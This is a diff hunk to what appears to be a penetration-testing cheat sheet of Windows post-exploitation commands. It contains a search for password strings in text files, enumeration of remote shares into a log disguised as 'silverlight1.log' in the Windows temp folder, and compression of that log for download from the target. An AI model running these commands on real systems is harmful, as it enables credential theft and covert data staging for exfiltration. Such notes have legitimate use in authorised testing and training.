@@ -9,10 +9,22 @@ dir /a /s /b C:\users\phillis.snyder\*pdf*
 findstr /SI password *.txt
 
 
-
-
 -- Tree Filesystem to Searchable File --
 
+# Enumerate entire folder structure (and child folders) to file using tree.com
+tree.com /F /A \\<IP_ADDRESS>\<FILE_PATH> >c:\windows\temp\silverlight1.log
+
+# Enumerate entire folder structure to file using "dir /s"
+dir /s /a \\<IP_ADDRESS>\<FILE_PATH> >c:\windows\temp\silverlight1.log
+
+# Enumerate entire folder structure to file using forfiles (Does not work with UNC paths)
+forfiles /S /C "cmd /c echo @path" /p <FILE_PATH> >c:\windows\temp\silverlight1.log
+
+# Compress file and download from target
+makecab c:\windows\temp\silverlight1.log c:\windows\temp\silverlight_compressed.zip
+
+# Extract results
+expand c:\users\administrator\desktop\silverlight_compressed.zip c:\users\administrator\desktop\extractedFile.txt
 
 
 -- Using Volume Shadow Service (VSS) --
